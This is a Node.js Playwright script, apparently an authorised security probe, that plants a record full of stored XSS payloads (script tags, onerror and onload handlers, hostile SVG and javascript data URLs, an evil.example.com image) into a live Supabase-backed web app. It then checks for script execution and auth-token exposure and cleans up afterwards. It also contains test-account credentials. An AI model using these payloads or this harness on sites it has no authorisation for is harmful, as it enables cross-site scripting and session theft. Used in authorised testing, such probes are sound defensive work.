// A03: stored XSS probe. Inserts one crafted row for user B via REST (all string fields set to payloads,
// image fields to hostile data URLs), opens it in the live site as B (workspace + every step + report), listens for
// script execution, then deletes the row. Also records storage/cookie/header facts.
const { chromium } = require('playwright');
const { execFileSync } = require('child_process');
// node's fetch ignores the sandbox proxy, so REST calls go through curl
async function fetch(url, o = {}) {
  const a = ['-s', '-w', '\n%{http_code}', '-X', o.method || 'GET'];
  for (const [k, v] of Object.entries(o.headers || {})) a.push('-H', `${k}: ${v}`);
  if (o.body) a.push('--data-binary', '@-');
  a.push(url);
  const out = execFileSync('curl', a, { input: o.body || '', maxBuffer: 1 << 28 }).toString();
  const i = out.lastIndexOf('\n');
  return { status: +out.slice(i + 1), json: async () => JSON.parse(out.slice(0, i)) };
}
const BASE = 'https://rca-tool-omega.vercel.app';
const API = 'https://ccigtztlrvgkzyppjmxt.supabase.co';
const KEY = 'sb_publishable_QkpZg53OX_eAMLJj4Ezjjw_SHOgUZ3D';
const EMAIL = 'qa-user-b@rca-tool.test', PW = 'Qa-Test-7f3k9x2m';
const ID = 't-xss-1';

const P = (n) => `"><img src=x onerror="window.__xss='${n}'"><script>window.__xss='${n}s'</script>'';alert(${n})//</title><svg onload="window.__xss='${n}v'">{{7*7}}`;
const svgScript = 'data:image/svg+xml;base64,' + Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="parent.__xss=\'svg-img\'"><script>parent.__xss="svg-script";top.__xss="svg-top"</script><rect width="10" height="10"/></svg>').toString('base64');
const IMAGES = [svgScript, 'javascript:window.__xss="js-url"', 'data:text/html,<script>parent.__xss="html-data"</script>', 'x" onerror="window.__xss=\'attr-break\'', 'https://evil.example.com/track.gif'];

function walk(o, f) { // set every string leaf except ids/enums via f
  if (Array.isArray(o)) return o.map((x) => walk(x, f));
  if (o && typeof o === 'object') return Object.fromEntries(Object.entries(o).map(([k, v]) => [k, walk(v, f, k)]));
  return o;
}
(async () => {
  const tokRes = await (await fetch(`${API}/auth/v1/token?grant_type=password`, { method: 'POST', headers: { apikey: KEY, 'Content-Type': 'application/json' }, body: JSON.stringify({ email: EMAIL, password: PW }) })).json();
  const H = { apikey: KEY, Authorization: 'Bearer ' + tokRes.access_token, 'Content-Type': 'application/json' };
  const rows = await (await fetch(`${API}/rest/v1/investigations?select=data&id=like.sample-*`, { headers: H })).json();
  const sample = rows[0].data;
  let n = 0;
  const skip = new Set(['id', 'schemaVersion', 'createdAt', 'updatedAt', 'isSample', 'type', 'category', 'status', 'date', 'dueDate', 'causeId', 'evidenceIds', 'reviewDate', 'recurred', 'image', 'currency']);
  const mutate = (o, key) => {
    if (typeof o === 'string') return skip.has(key) ? o : P(++n);
    if (Array.isArray(o)) return o.map((x) => mutate(x, key));
    if (o && typeof o === 'object') return Object.fromEntries(Object.entries(o).map(([k, v]) => [k, mutate(v, k)]));
    return o;
  };
  const inv = mutate(sample, '');
  inv.id = ID; inv.isSample = false; inv.problem.title = P(0);
  inv.evidence = (inv.evidence.length ? inv.evidence : [{ id: 'e1', type: 'photo', title: '', note: '', date: '' }]);
  while (inv.evidence.length < IMAGES.length) inv.evidence.push({ ...inv.evidence[0], id: 'ex' + inv.evidence.length });
  inv.evidence.forEach((e, i) => { e.image = IMAGES[i % IMAGES.length]; });
  const ins = await fetch(`${API}/rest/v1/investigations`, { method: 'POST', headers: { ...H, Prefer: 'return=minimal' }, body: JSON.stringify({ id: ID, data: inv }) });
  console.log('insert crafted row:', ins.status, 'string fields mutated:', n);

  const browser = await chromium.launch({ proxy: process.env.HTTPS_PROXY ? { server: process.env.HTTPS_PROXY } : undefined });
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  const dialogs = [], reqs = [];
  page.on('dialog', async (d) => { dialogs.push(d.message()); await d.dismiss(); });
  page.on('request', (r) => { const u = r.url(); if (!u.startsWith(BASE) && !u.startsWith(API)) reqs.push(u.slice(0, 80)); });
  const logs = []; page.on('console', (m) => { if (m.type() === 'error') logs.push(m.text().slice(0, 120)); });
  const hdr = {};
  page.on('response', (r) => { if (r.url() === BASE + '/login') Object.assign(hdr, r.headers()); });
  await page.goto(BASE + '/login');
  await page.getByLabel(/email/i).fill(EMAIL);
  await page.getByLabel(/password/i).fill(PW);
  await page.getByRole('button', { name: /sign in|log in/i }).click();
  await page.waitForURL('**/app**', { timeout: 20000 });
  await page.waitForTimeout(2000);
  const storage = await page.evaluate(() => ({ ls: Object.keys(localStorage), ss: Object.keys(sessionStorage) }));
  const cookies = await ctx.cookies();
  console.log('storage keys:', JSON.stringify(storage));
  console.log('cookies set by site:', JSON.stringify(cookies.map((c) => ({ name: c.name, domain: c.domain, httpOnly: c.httpOnly, secure: c.secure, sameSite: c.sameSite }))));
  const tokKey = storage.ls.find((k) => /auth-token/.test(k));
  const tv = await page.evaluate((k) => JSON.parse(localStorage.getItem(k)), tokKey);
  console.log('token entry fields:', Object.keys(tv), 'expires_in', tv.expires_in, '(refresh_token present:', !!tv.refresh_token + ')');
  await page.goto(`${BASE}/app/investigations/${ID}`);
  await page.waitForTimeout(2500);
  console.log('document.title =', JSON.stringify(await page.title()));
  for (const step of ['problem', 'loss', 'evidence', 'cause', 'actions', 'verify', 'report']) {
    await page.evaluate((s) => { location.hash = s; window.dispatchEvent(new HashChangeEvent('hashchange')); }, step);
    const tab = page.getByRole('button', { name: new RegExp('^' + step.replace(/^./, (c) => c.toUpperCase()), 'i') }).first();
    await tab.click({ timeout: 3000 }).catch(() => {});
    await page.waitForTimeout(700);
    // expand evidence cards so the editor <img> renders too
    if (step === 'evidence') { for (const b of await page.getByRole('button', { name: /edit|open|expand/i }).all()) await b.click().catch(() => {}); }
    console.log(`step ${step}: __xss=${JSON.stringify(await page.evaluate(() => window.__xss ?? null))} dialogs=${dialogs.length}`);
  }
  // image elements actually rendered in the report/evidence
  const imgs = await page.evaluate(() => [...document.images].map((i) => i.src.slice(0, 50)));
  console.log('rendered <img> srcs:', JSON.stringify(imgs));
  console.log('final window.__xss =', await page.evaluate(() => window.__xss ?? null), '| dialogs:', JSON.stringify(dialogs));
  console.log('third-party requests (non-site, non-supabase):', JSON.stringify(reqs));
  console.log('injected <script> elements from data:', await page.evaluate(() => [...document.querySelectorAll('script:not([src])')].filter((s) => s.textContent.includes('__xss')).length), '| injected onerror imgs:', await page.evaluate(() => document.querySelectorAll('img[onerror],svg[onload]').length));
  // direct navigation to the hostile data URLs as top-level docs (what a user would get if they open the image in a tab)
  await page.screenshot({ path: 'xss-report.png', fullPage: false });
  // cleanup
  const del = await fetch(`${API}/rest/v1/investigations?id=eq.${ID}`, { method: 'DELETE', headers: { ...H, Prefer: 'return=minimal' } });
  console.log('cleanup delete:', del.status);
  await browser.close();
})().catch((e) => { console.error('ERR', e); process.exit(1); });
